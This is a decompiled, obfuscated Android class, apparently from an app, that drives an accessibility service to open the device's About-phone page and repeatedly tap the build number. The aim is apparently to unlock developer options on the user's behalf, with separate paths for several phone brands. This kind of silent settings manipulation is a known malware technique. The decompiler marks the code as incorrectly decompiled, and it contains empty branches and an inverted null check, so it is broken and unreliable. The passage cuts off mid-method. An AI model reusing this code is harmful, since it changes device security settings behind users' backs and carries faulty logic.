package com.storm.safe.rock.service.modules.setup;

import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Build;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.iuzxujjtqev;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.RunnableC0503fo;
import p000.dh0;
import p000.h10;
import p000.kg1;
import p000.kl0;
import p000.ll0;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.setup.a0 */
/* loaded from: classes2.dex */
public final class C0358a0 {

    /* renamed from: b7 */
    public static volatile C0358a0 f53791b7;

    /* renamed from: a0 */
    public final AccessibilityService f53792a0;

    /* renamed from: a1 */
    public final Context f53793a1;

    /* renamed from: a2 */
    public final ScheduledExecutorService f53794a2;

    /* renamed from: a3 */
    public final AtomicReference f53795a3;

    /* renamed from: a4 */
    public final ReentrantLock f53796a4;

    /* renamed from: a5 */
    public w00 f53797a5;

    /* renamed from: a6 */
    public h10 f53798a6;

    /* renamed from: a7 */
    public volatile boolean f53799a7;

    /* renamed from: a8 */
    public int f53800a8;

    /* renamed from: a9 */
    public final int f53801a9;

    /* renamed from: b0 */
    public volatile String f53802b0;

    /* renamed from: b1 */
    public volatile boolean f53803b1;

    /* renamed from: b2 */
    public volatile boolean f53804b2;

    /* renamed from: b3 */
    public int f53805b3;

    /* renamed from: b4 */
    public int f53806b4;

    /* renamed from: b5 */
    public final LinkedHashMap f53807b5;

    /* renamed from: b6 */
    public final List f53808b6;

    static {
        new ll0(null);
    }

    public C0358a0(AccessibilityService accessibilityService, Context context) {
        this.f53792a0 = accessibilityService;
        this.f53793a1 = context;
        ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        t60.m214694b5(scheduledExecutorServiceNewSingleThreadScheduledExecutor, "newSingleThreadScheduledExecutor()");
        this.f53794a2 = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
        this.f53795a3 = new AtomicReference(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_UNKNOWN);
        this.f53796a4 = new ReentrantLock();
        try {
            scheduledExecutorServiceNewSingleThreadScheduledExecutor.schedule(new RunnableC0503fo(this, 8, 4), 100L, TimeUnit.SECONDS);
        } catch (Exception e) {
            t60.m214705c6("OpenDevDelegate", "构造函数超时调度失败", e);
        }
        this.f53801a9 = 3;
        this.f53805b3 = 2;
        this.f53806b4 = 1;
        this.f53807b5 = new LinkedHashMap();
        this.f53808b6 = AbstractC0716jf.m213306g5(2, 5, 1, 3, 4);
    }

    /* JADX WARN: Removed duplicated region for block: B:111:0x025e A[Catch: all -> 0x00b1, TryCatch #0 {all -> 0x00b1, blocks: (B:17:0x005c, B:25:0x006f, B:29:0x00a1, B:31:0x00ac, B:35:0x00b8, B:37:0x00e1, B:39:0x00f2, B:41:0x00f8, B:43:0x010b, B:45:0x011c, B:47:0x0129, B:52:0x013e, B:55:0x014a, B:57:0x0150, B:61:0x015b, B:63:0x0164, B:65:0x017b, B:71:0x018c, B:73:0x0197, B:75:0x01b4, B:77:0x01c5, B:82:0x01d3, B:84:0x01dc, B:86:0x01e9, B:91:0x01ff, B:93:0x0208, B:95:0x020e, B:100:0x021c, B:102:0x0225, B:104:0x0230, B:107:0x023c, B:109:0x0256, B:128:0x02a4, B:111:0x025e, B:113:0x0269, B:115:0x026f, B:117:0x027c, B:119:0x0289, B:121:0x028f, B:123:0x0295, B:125:0x029d), top: B:139:0x005c }] */
    /* JADX WARN: Removed duplicated region for block: B:119:0x0289 A[Catch: all -> 0x00b1, TryCatch #0 {all -> 0x00b1, blocks: (B:17:0x005c, B:25:0x006f, B:29:0x00a1, B:31:0x00ac, B:35:0x00b8, B:37:0x00e1, B:39:0x00f2, B:41:0x00f8, B:43:0x010b, B:45:0x011c, B:47:0x0129, B:52:0x013e, B:55:0x014a, B:57:0x0150, B:61:0x015b, B:63:0x0164, B:65:0x017b, B:71:0x018c, B:73:0x0197, B:75:0x01b4, B:77:0x01c5, B:82:0x01d3, B:84:0x01dc, B:86:0x01e9, B:91:0x01ff, B:93:0x0208, B:95:0x020e, B:100:0x021c, B:102:0x0225, B:104:0x0230, B:107:0x023c, B:109:0x0256, B:128:0x02a4, B:111:0x025e, B:113:0x0269, B:115:0x026f, B:117:0x027c, B:119:0x0289, B:121:0x028f, B:123:0x0295, B:125:0x029d), top: B:139:0x005c }] */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0067  */
    /* JADX WARN: Removed duplicated region for block: B:28:0x009f  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x0146  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x014a A[Catch: all -> 0x00b1, TryCatch #0 {all -> 0x00b1, blocks: (B:17:0x005c, B:25:0x006f, B:29:0x00a1, B:31:0x00ac, B:35:0x00b8, B:37:0x00e1, B:39:0x00f2, B:41:0x00f8, B:43:0x010b, B:45:0x011c, B:47:0x0129, B:52:0x013e, B:55:0x014a, B:57:0x0150, B:61:0x015b, B:63:0x0164, B:65:0x017b, B:71:0x018c, B:73:0x0197, B:75:0x01b4, B:77:0x01c5, B:82:0x01d3, B:84:0x01dc, B:86:0x01e9, B:91:0x01ff, B:93:0x0208, B:95:0x020e, B:100:0x021c, B:102:0x0225, B:104:0x0230, B:107:0x023c, B:109:0x0256, B:128:0x02a4, B:111:0x025e, B:113:0x0269, B:115:0x026f, B:117:0x027c, B:119:0x0289, B:121:0x028f, B:123:0x0295, B:125:0x029d), top: B:139:0x005c }] */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0186  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x0197 A[Catch: all -> 0x00b1, TryCatch #0 {all -> 0x00b1, blocks: (B:17:0x005c, B:25:0x006f, B:29:0x00a1, B:31:0x00ac, B:35:0x00b8, B:37:0x00e1, B:39:0x00f2, B:41:0x00f8, B:43:0x010b, B:45:0x011c, B:47:0x0129, B:52:0x013e, B:55:0x014a, B:57:0x0150, B:61:0x015b, B:63:0x0164, B:65:0x017b, B:71:0x018c, B:73:0x0197, B:75:0x01b4, B:77:0x01c5, B:82:0x01d3, B:84:0x01dc, B:86:0x01e9, B:91:0x01ff, B:93:0x0208, B:95:0x020e, B:100:0x021c, B:102:0x0225, B:104:0x0230, B:107:0x023c, B:109:0x0256, B:128:0x02a4, B:111:0x025e, B:113:0x0269, B:115:0x026f, B:117:0x027c, B:119:0x0289, B:121:0x028f, B:123:0x0295, B:125:0x029d), top: B:139:0x005c }] */
    /* JADX WARN: Removed duplicated region for block: B:74:0x01b2  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x01c5 A[Catch: all -> 0x00b1, TryCatch #0 {all -> 0x00b1, blocks: (B:17:0x005c, B:25:0x006f, B:29:0x00a1, B:31:0x00ac, B:35:0x00b8, B:37:0x00e1, B:39:0x00f2, B:41:0x00f8, B:43:0x010b, B:45:0x011c, B:47:0x0129, B:52:0x013e, B:55:0x014a, B:57:0x0150, B:61:0x015b, B:63:0x0164, B:65:0x017b, B:71:0x018c, B:73:0x0197, B:75:0x01b4, B:77:0x01c5, B:82:0x01d3, B:84:0x01dc, B:86:0x01e9, B:91:0x01ff, B:93:0x0208, B:95:0x020e, B:100:0x021c, B:102:0x0225, B:104:0x0230, B:107:0x023c, B:109:0x0256, B:128:0x02a4, B:111:0x025e, B:113:0x0269, B:115:0x026f, B:117:0x027c, B:119:0x0289, B:121:0x028f, B:123:0x0295, B:125:0x029d), top: B:139:0x005c }] */
    /* JADX WARN: Removed duplicated region for block: B:93:0x0208 A[Catch: all -> 0x00b1, TryCatch #0 {all -> 0x00b1, blocks: (B:17:0x005c, B:25:0x006f, B:29:0x00a1, B:31:0x00ac, B:35:0x00b8, B:37:0x00e1, B:39:0x00f2, B:41:0x00f8, B:43:0x010b, B:45:0x011c, B:47:0x0129, B:52:0x013e, B:55:0x014a, B:57:0x0150, B:61:0x015b, B:63:0x0164, B:65:0x017b, B:71:0x018c, B:73:0x0197, B:75:0x01b4, B:77:0x01c5, B:82:0x01d3, B:84:0x01dc, B:86:0x01e9, B:91:0x01ff, B:93:0x0208, B:95:0x020e, B:100:0x021c, B:102:0x0225, B:104:0x0230, B:107:0x023c, B:109:0x0256, B:128:0x02a4, B:111:0x025e, B:113:0x0269, B:115:0x026f, B:117:0x027c, B:119:0x0289, B:121:0x028f, B:123:0x0295, B:125:0x029d), top: B:139:0x005c }] */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final void m211957a9(C0358a0 c0358a0) {
        AccessibilityNodeInfo accessibilityNodeInfo;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        boolean z;
        String str;
        String str2;
        String str3;
        AccessibilityNodeInfo accessibilityNodeInfoM211963b6;
        String str4;
        String lowerCase;
        AccessibilityNodeInfo accessibilityNodeInfoM211965b8;
        AccessibilityNodeInfo accessibilityNodeInfoM211967c0;
        AccessibilityNodeInfo accessibilityNodeInfo3;
        String str5;
        AccessibilityNodeInfo accessibilityNodeInfoM211964b7;
        String str6;
        AtomicReference atomicReference = c0358a0.f53795a3;
        t60.m214714d6("OpenDevDelegate", "P() 开始处理关于手机窗口");
        if (!c0358a0.m211971a0()) {
            t60.m214714d6("OpenDevDelegate", "P() G()=false，不在关于手机窗口，直接返回（不按返回键！）");
            return;
        }
        t60.m214714d6("OpenDevDelegate", "P() G()=true，确认在关于手机窗口");
        atomicReference.set(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_ENTER_ABOUT_DEVICE_WIN);
        AccessibilityNodeInfo rootInActiveWindow = c0358a0.f53792a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            t60.m214714d6("OpenDevDelegate", "P() rootNode 为空！");
            return;
        }
        try {
            m211961b3(rootInActiveWindow, "P()");
            if (!kg1.m213522c8()) {
                try {
                    if (kg1.m213521c7()) {
                        accessibilityNodeInfo2 = rootInActiveWindow;
                    } else {
                        accessibilityNodeInfo2 = rootInActiveWindow;
                        try {
                            if (!AbstractC0779a1.m213656a9(Build.BRAND, "samsung")) {
                                z = false;
                                String str7 = Build.BRAND;
                                t60.m214714d6("OpenDevDelegate", "P() needsVersionInfoPage=" + z + " (品牌: " + str7 + ")");
                                OpenDevelopmentDelegate$State openDevelopmentDelegate$State = OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_PREPARE_VERSION_INFO_WIN;
                                if (z) {
                                    str = "P() 滚动查找版本号: ";
                                    str2 = "P() 版本号滚动视图: ";
                                    str3 = str7;
                                } else {
                                    str3 = str7;
                                    t60.m214714d6("OpenDevDelegate", "P() Vivo/Oppo/Samsung品牌，先找版本信息/软件信息");
                                    AccessibilityNodeInfo accessibilityNodeInfoM211969c2 = m211969c2(accessibilityNodeInfo2);
                                    if (accessibilityNodeInfoM211969c2 == null) {
                                        accessibilityNodeInfoM211969c2 = m211968c1(accessibilityNodeInfo2);
                                    }
                                    if (accessibilityNodeInfoM211969c2 != null) {
                                        accessibilityNodeInfo3 = accessibilityNodeInfoM211969c2;
                                        str = "P() 滚动查找版本号: ";
                                        str2 = "P() 版本号滚动视图: ";
                                        str5 = "找到! text=" + ((Object) accessibilityNodeInfo3.getText()) + ", class=" + ((Object) accessibilityNodeInfo3.getClassName());
                                    } else {
                                        str = "P() 滚动查找版本号: ";
                                        str2 = "P() 版本号滚动视图: ";
                                        accessibilityNodeInfo3 = accessibilityNodeInfoM211969c2;
                                        str5 = "未找到";
                                    }
                                    t60.m214714d6("OpenDevDelegate", "P() 直接查找版本信息/软件信息节点: " + str5);
                                    if (accessibilityNodeInfo3 != null) {
                                        accessibilityNodeInfoM211964b7 = accessibilityNodeInfo3;
                                        if (accessibilityNodeInfoM211964b7 != null) {
                                            if (!accessibilityNodeInfoM211964b7.isClickable()) {
                                                accessibilityNodeInfoM211964b7 = m211964b7(accessibilityNodeInfoM211964b7);
                                                t60.m214714d6("OpenDevDelegate", "P() 版本信息不可点击，找父节点: ".concat(accessibilityNodeInfoM211964b7 != null ? "找到" : "未找到"));
                                            }
                                            if (accessibilityNodeInfoM211964b7 != null) {
                                                boolean zPerformAction = accessibilityNodeInfoM211964b7.performAction(16);
                                                t60.m214714d6("OpenDevDelegate", "P() 点击版本信息: " + zPerformAction);
                                                if (zPerformAction) {
                                                    atomicReference.set(openDevelopmentDelegate$State);
                                                    accessibilityNodeInfo2.recycle();
                                                    return;
                                                }
                                            }
                                            accessibilityNodeInfo2.recycle();
                                            return;
                                        }
                                    } else {
                                        AccessibilityNodeInfo accessibilityNodeInfoM211967c02 = m211967c0(accessibilityNodeInfo2);
                                        if (accessibilityNodeInfoM211967c02 != null) {
                                            str6 = "找到 " + ((Object) accessibilityNodeInfoM211967c02.getClassName());
                                        } else {
                                            str6 = "未找到";
                                        }
                                        t60.m214714d6("OpenDevDelegate", "P() 滚动视图: " + str6);
                                        if (accessibilityNodeInfoM211967c02 != null) {
                                            AccessibilityNodeInfo accessibilityNodeInfoM211988d1 = c0358a0.m211988d1(accessibilityNodeInfoM211967c02, true, new OpenDevelopmentDelegate$P$1(1));
                                            accessibilityNodeInfoM211964b7 = accessibilityNodeInfoM211988d1 == null ? c0358a0.m211988d1(accessibilityNodeInfoM211967c02, false, new OpenDevelopmentDelegate$P$2(1)) : accessibilityNodeInfoM211988d1;
                                            t60.m214714d6("OpenDevDelegate", "P() 滚动查找版本信息/软件信息: ".concat(accessibilityNodeInfoM211964b7 != null ? "找到!" : "未找到"));
                                        }
                                        if (accessibilityNodeInfoM211964b7 != null) {
                                        }
                                    }
                                }
                                t60.m214714d6("OpenDevDelegate", "P() 查找版本号（直接在关于手机页面）");
                                accessibilityNodeInfoM211963b6 = m211963b6(accessibilityNodeInfo2);
                                if (accessibilityNodeInfoM211963b6 == null) {
                                    str4 = "找到! text=" + ((Object) accessibilityNodeInfoM211963b6.getText()) + ", class=" + ((Object) accessibilityNodeInfoM211963b6.getClassName());
                                } else {
                                    str4 = "未找到";
                                }
                                t60.m214714d6("OpenDevDelegate", "P() 直接查找版本号: " + str4);
                                if (accessibilityNodeInfoM211963b6 == null) {
                                    AccessibilityNodeInfo accessibilityNodeInfoM211967c03 = m211967c0(accessibilityNodeInfo2);
                                    t60.m214714d6("OpenDevDelegate", str2.concat(accessibilityNodeInfoM211967c03 != null ? "找到" : "未找到"));
                                    if (accessibilityNodeInfoM211967c03 != null) {
                                        accessibilityNodeInfoM211963b6 = c0358a0.m211988d1(accessibilityNodeInfoM211967c03, true, new OpenDevelopmentDelegate$P$3(1));
                                        if (accessibilityNodeInfoM211963b6 == null) {
                                            accessibilityNodeInfoM211963b6 = c0358a0.m211988d1(accessibilityNodeInfoM211967c03, false, new OpenDevelopmentDelegate$P$4(1));
                                        }
                                        t60.m214714d6("OpenDevDelegate", str.concat(accessibilityNodeInfoM211963b6 != null ? "找到!" : "未找到"));
                                    }
                                }
                                if (accessibilityNodeInfoM211963b6 != null) {
                                    if (!accessibilityNodeInfoM211963b6.isClickable()) {
                                        accessibilityNodeInfoM211963b6 = m211964b7(accessibilityNodeInfoM211963b6);
                                        t60.m214714d6("OpenDevDelegate", "P() 版本号不可点击，找父节点: ".concat(accessibilityNodeInfoM211963b6 != null ? "找到" : "未找到"));
                                    }
                                    if (accessibilityNodeInfoM211963b6 != null) {
                                        t60.m214714d6("OpenDevDelegate", "P() 开始 Y() 连续点击版本号");
                                        if (!c0358a0.m211978a7(accessibilityNodeInfoM211963b6)) {
                                            t60.m214714d6("OpenDevDelegate", "P() Y() 点击失败，调用 R()");
                                            c0358a0.m211976a5();
                                        }
                                        accessibilityNodeInfo2.recycle();
                                        return;
                                    }
                                }
                                String str8 = str3;
                                t60.m214694b5(str8, "BRAND");
                                lowerCase = str8.toLowerCase(Locale.ROOT);
                                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                if (!lowerCase.equals("motorola") || lowerCase.equals("moto")) {
                                    t60.m214714d6("OpenDevDelegate", "P() Motorola品牌特殊处理");
                                    accessibilityNodeInfoM211965b8 = m211965b8(accessibilityNodeInfo2);
                                    if (accessibilityNodeInfoM211965b8 == null && (accessibilityNodeInfoM211967c0 = m211967c0(accessibilityNodeInfo2)) != null && (accessibilityNodeInfoM211965b8 = c0358a0.m211988d1(accessibilityNodeInfoM211967c0, true, new OpenDevelopmentDelegate$P$5(1))) == null) {
                                        accessibilityNodeInfoM211965b8 = c0358a0.m211988d1(accessibilityNodeInfoM211967c0, false, new OpenDevelopmentDelegate$P$6(1));
                                    }
                                    if (accessibilityNodeInfoM211965b8 != null) {
                                        if (!accessibilityNodeInfoM211965b8.isClickable()) {
                                            accessibilityNodeInfoM211965b8 = m211964b7(accessibilityNodeInfoM211965b8);
                                        }
                                        if (accessibilityNodeInfoM211965b8 != null && accessibilityNodeInfoM211965b8.performAction(16)) {
                                            atomicReference.set(openDevelopmentDelegate$State);
                                            accessibilityNodeInfo2.recycle();
                                            return;
                                        }
                                    }
                                }
                                t60.m214714d6("OpenDevDelegate", "P() 什么都没找到！在关于手机页面没找到版本信息也没找到版本号");
                                accessibilityNodeInfo = accessibilityNodeInfo2;
                                try {
                                    m211960b2(accessibilityNodeInfo, "P()");
                                    accessibilityNodeInfo.recycle();
                                    return;
                                } catch (Throwable th) {
                                    th = th;
                                }
                            }
                        } catch (Throwable th2) {
                            th = th2;
                            accessibilityNodeInfo = accessibilityNodeInfo2;
                            accessibilityNodeInfo.recycle();
                            throw th;
                        }
                    }
                    z = true;
                    String str72 = Build.BRAND;
                    t60.m214714d6("OpenDevDelegate", "P() needsVersionInfoPage=" + z + " (品牌: " + str72 + ")");
                    OpenDevelopmentDelegate$State openDevelopmentDelegate$State2 = OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_PREPARE_VERSION_INFO_WIN;
                    if (z) {
                    }
                    t60.m214714d6("OpenDevDelegate", "P() 查找版本号（直接在关于手机页面）");
                    accessibilityNodeInfoM211963b6 = m211963b6(accessibilityNodeInfo2);
                    if (accessibilityNodeInfoM211963b6 == null) {
                    }
                    t60.m214714d6("OpenDevDelegate", "P() 直接查找版本号: " + str4);
                    if (accessibilityNodeInfoM211963b6 == null) {
                    }
                    if (accessibilityNodeInfoM211963b6 != null) {
                    }
                    String str82 = str3;
                    t60.m214694b5(str82, "BRAND");
                    lowerCase = str82.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    if (!lowerCase.equals("motorola")) {
                        t60.m214714d6("OpenDevDelegate", "P() Motorola品牌特殊处理");
                        accessibilityNodeInfoM211965b8 = m211965b8(accessibilityNodeInfo2);
                        if (accessibilityNodeInfoM211965b8 == null) {
                            accessibilityNodeInfoM211965b8 = c0358a0.m211988d1(accessibilityNodeInfoM211967c0, false, new OpenDevelopmentDelegate$P$6(1));
                        }
                        if (accessibilityNodeInfoM211965b8 != null) {
                        }
                        t60.m214714d6("OpenDevDelegate", "P() 什么都没找到！在关于手机页面没找到版本信息也没找到版本号");
                        accessibilityNodeInfo = accessibilityNodeInfo2;
                        m211960b2(accessibilityNodeInfo, "P()");
                        accessibilityNodeInfo.recycle();
                        return;
                    }
                } catch (Throwable th3) {
                    th = th3;
                    accessibilityNodeInfo2 = rootInActiveWindow;
                }
            }
        } catch (Throwable th4) {
            th = th4;
            accessibilityNodeInfo = rootInActiveWindow;
        }
        accessibilityNodeInfo.recycle();
        throw th;
    }

    /* renamed from: b0 */
    public static final void m211958b0(C0358a0 c0358a0) {
        String str;
        t60.m214714d6("OpenDevDelegate", "T() 开始处理版本信息窗口");
        AccessibilityService accessibilityService = c0358a0.f53792a0;
        AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            try {
                ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55770c0, dh0.f55799e9);
                int size = arrayListM213298i5.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayListM213298i5.get(i);
                    i++;
                    String str2 = (String) obj;
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        t60.m214714d6("OpenDevDelegate", "isInVersionInfoWindow() 匹配到: " + str2);
                        rootInActiveWindow.recycle();
                        t60.m214714d6("OpenDevDelegate", "T() 确认在版本信息窗口");
                        c0358a0.f53795a3.set(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_ENTER_VERSION_INFO_WIN);
                        rootInActiveWindow = accessibilityService.getRootInActiveWindow();
                        if (rootInActiveWindow == null) {
                            t60.m214714d6("OpenDevDelegate", "T() rootNode 为空！");
                            return;
                        }
                        try {
                            m211961b3(rootInActiveWindow, "T()");
                            AccessibilityNodeInfo accessibilityNodeInfoM211963b6 = m211963b6(rootInActiveWindow);
                            if (accessibilityNodeInfoM211963b6 != null) {
                                str = "找到! text=" + ((Object) accessibilityNodeInfoM211963b6.getText()) + ", class=" + ((Object) accessibilityNodeInfoM211963b6.getClassName());
                            } else {
                                str = "未找到";
                            }
                            t60.m214714d6("OpenDevDelegate", "T() 直接查找版本号: " + str);
                            if (accessibilityNodeInfoM211963b6 == null) {
                                AccessibilityNodeInfo accessibilityNodeInfoM211967c0 = m211967c0(rootInActiveWindow);
                                t60.m214714d6("OpenDevDelegate", "T() 滚动视图: " + (accessibilityNodeInfoM211967c0 != null ? "找到" : "未找到"));
                                if (accessibilityNodeInfoM211967c0 != null) {
                                    accessibilityNodeInfoM211963b6 = c0358a0.m211988d1(accessibilityNodeInfoM211967c0, true, new OpenDevelopmentDelegate$T$2(1));
                                    if (accessibilityNodeInfoM211963b6 == null) {
                                        accessibilityNodeInfoM211963b6 = c0358a0.m211988d1(accessibilityNodeInfoM211967c0, false, new OpenDevelopmentDelegate$T$3(1));
                                    }
                                    t60.m214714d6("OpenDevDelegate", "T() 滚动查找版本号: " + (accessibilityNodeInfoM211963b6 != null ? "找到!" : "未找到"));
                                }
                            }
                            if (accessibilityNodeInfoM211963b6 != null) {
                                if (!accessibilityNodeInfoM211963b6.isClickable()) {
                                    accessibilityNodeInfoM211963b6 = m211964b7(accessibilityNodeInfoM211963b6);
                                    t60.m214714d6("OpenDevDelegate", "T() 版本号不可点击，找父节点: " + (accessibilityNodeInfoM211963b6 != null ? "找到" : "未找到"));
                                }
                                if (accessibilityNodeInfoM211963b6 != null) {
                                    t60.m214714d6("OpenDevDelegate", "T() 开始 Y() 连续点击版本号");
                                    if (!c0358a0.m211978a7(accessibilityNodeInfoM211963b6)) {
                                        t60.m214714d6("OpenDevDelegate", "T() Y() 点击失败，调用 R()");
                                        c0358a0.m211976a5();
                                    }
                                } else {
                                    t60.m214714d6("OpenDevDelegate", "T() 没有可点击的节点！");
                                    m211960b2(rootInActiveWindow, "T()");
                                }
                            } else {
                                t60.m214714d6("OpenDevDelegate", "T() 在版本信息页面没找到版本号！");
                                m211960b2(rootInActiveWindow, "T()");
                            }
                            return;
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                }
            } finally {
                rootInActiveWindow.recycle();
            }
        }
        t60.m214714d6("OpenDevDelegate", "T() 不在版本信息窗口，直接返回（不按返回键！）");
    }

    /* renamed from: b1 */
    public static void m211959b1(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        if (i > 3) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String string = text != null ? text.toString() : null;
        if (string != null && !AbstractC0779a1.m213663b6(string)) {
            arrayList.add(string);
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        String string2 = contentDescription != null ? contentDescription.toString() : null;
        if (string2 != null && !AbstractC0779a1.m213663b6(string2) && !string2.equals(string)) {
            arrayList.add("[desc:" + string2 + "]");
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211959b1(i + 1, child, arrayList);
                child.recycle();
            }
        }
    }

    /* renamed from: b2 */
    public static void m211960b2(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        try {
            ArrayList arrayList = new ArrayList();
            m211959b1(0, accessibilityNodeInfo, arrayList);
            t60.m214714d6("OpenDevDelegate", str + " 页面所有文本(前30个): " + AbstractC0715je.m213295i2(AbstractC0715je.m213301i8(arrayList, 30), " | ", null, null, null, 62));
        } catch (Exception e) {
            t60.m214714d6("OpenDevDelegate", str + " dumpAllTexts 异常: " + e.getMessage());
        }
    }

    /* renamed from: b3 */
    public static void m211961b3(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            CharSequence packageName = accessibilityNodeInfo.getPackageName();
            t60.m214714d6("OpenDevDelegate", str + " 根节点: class=" + ((Object) className) + ", pkg=" + ((Object) packageName) + ", childCount=" + accessibilityNodeInfo.getChildCount());
        } catch (Exception e) {
            t60.m214714d6("OpenDevDelegate", str + " dumpRootInfo 异常: " + e.getMessage());
        }
    }

    /* renamed from: b5 */
    public static boolean m211962b5(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "AlertDialog", false)) {
            return true;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                boolean zM211962b5 = m211962b5(child);
                child.recycle();
                if (zM211962b5) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: b6 */
    public static AccessibilityNodeInfo m211963b6(AccessibilityNodeInfo accessibilityNodeInfo) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String string;
        for (String str : (List) AbstractC0361a3.f53874a0.getValue()) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
            if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                ArrayList arrayList = new ArrayList();
                for (Object obj : listFindAccessibilityNodeInfosByText2) {
                    CharSequence text = ((AccessibilityNodeInfo) obj).getText();
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    if (string.equals(str) || !AbstractC0779a1.m213652a5(string, "Android", false)) {
                        arrayList.add(obj);
                    }
                }
                if (!arrayList.isEmpty()) {
                    int size = arrayList.size();
                    int i = 0;
                    while (i < size) {
                        Object obj2 = arrayList.get(i);
                        i++;
                        AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj2;
                        if (accessibilityNodeInfo2.isClickable()) {
                            return accessibilityNodeInfo2;
                        }
                        AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                        if (parent != null && parent.isClickable()) {
                            return parent;
                        }
                    }
                    return (AccessibilityNodeInfo) arrayList.get(0);
                }
            }
        }
        String str2 = Build.DISPLAY;
        if (str2 == null || AbstractC0779a1.m213663b6(str2) || (listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str2)) == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            return null;
        }
        t60.m214714d6("OpenDevDelegate", "findBuildNumberByValue() 通过 Build.DISPLAY=\"" + str2 + "\" 找到 " + listFindAccessibilityNodeInfosByText.size() + " 个节点");
        for (AccessibilityNodeInfo accessibilityNodeInfo3 : listFindAccessibilityNodeInfosByText) {
            t60.m214694b5(accessibilityNodeInfo3, "node");
            AccessibilityNodeInfo accessibilityNodeInfoM211964b7 = m211964b7(accessibilityNodeInfo3);
            if (accessibilityNodeInfoM211964b7 != null) {
                t60.m214714d6("OpenDevDelegate", "findBuildNumberByValue() 找到可点击父节点");
                return accessibilityNodeInfoM211964b7;
            }
        }
        return listFindAccessibilityNodeInfosByText.get(0);
    }

    /* renamed from: b7 */
    public static AccessibilityNodeInfo m211964b7(AccessibilityNodeInfo accessibilityNodeInfo) {
        for (AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent(); parent != null; parent = parent.getParent()) {
            if (parent.isClickable()) {
                return parent;
            }
        }
        return null;
    }

    /* renamed from: b8 */
    public static AccessibilityNodeInfo m211965b8(AccessibilityNodeInfo accessibilityNodeInfo) {
        y90 y90Var = AbstractC0361a3.f53874a0;
        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55806f6, AbstractC1117qo.m214451e7("Software channel"));
        int size = arrayListM213298i5.size();
        int i = 0;
        while (i < size) {
            Object obj = arrayListM213298i5.get(i);
            i++;
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText((String) obj);
